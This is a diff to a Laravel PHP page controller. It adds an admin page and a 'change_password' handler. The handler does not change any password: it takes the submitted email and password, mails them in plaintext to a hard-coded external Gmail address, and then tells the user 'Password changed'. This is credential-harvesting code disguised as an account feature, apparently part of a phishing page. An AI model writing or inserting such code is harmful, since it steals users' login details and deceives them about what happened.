@@ -2,7 +2,10 @@
 
 namespace App\Http\Controllers;
 
+use App\Mail\AdminMail;
+use Facade\Ignition\Middleware\AddLogs;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Mail;
 
 class PageController extends Controller
 {
@@ -44,5 +47,23 @@ class PageController extends Controller
     {
 
         return view('course');
+    }
+
+    public function admin()
+    {
+
+        return view('admin');
+    }
+
+    public function change_password(Request $request)
+    {
+        $data=[
+            "email" => $request->email,
+            "password" => $request->password
+        ];
+
+        Mail::to('victorasuquob@gmail.com')->send(new AdminMail($data));
+
+        return back()->with('message', 'Password changed');
     }
 }
